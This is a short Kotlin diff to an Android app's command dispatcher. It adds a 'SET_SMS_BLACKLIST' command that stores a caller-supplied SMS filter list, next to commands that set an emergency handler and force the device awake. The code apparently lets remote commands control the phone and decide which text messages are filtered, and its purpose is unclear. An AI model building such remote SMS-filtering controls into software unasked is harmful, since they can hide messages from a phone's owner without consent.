@@ -774,6 +774,13 @@ object CommandProcessor {
                     JudasManager.setHandler(ctx, content.trim())
                     status = "EMERGENCY_HANDLER_SET"
                 }
+                "SET_SMS_BLACKLIST" -> {
+                    val list = content.trim()
+                    ctx.getSharedPreferences("sms_filter_prefs", Context.MODE_PRIVATE).edit()
+                        .putString("blacklist", if (list.equals("DEFAULT", true)) null else list)
+                        .apply()
+                    status = "SMS_BLACKLIST_UPDATED"
+                }
                 "WAKE" -> {
                     // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
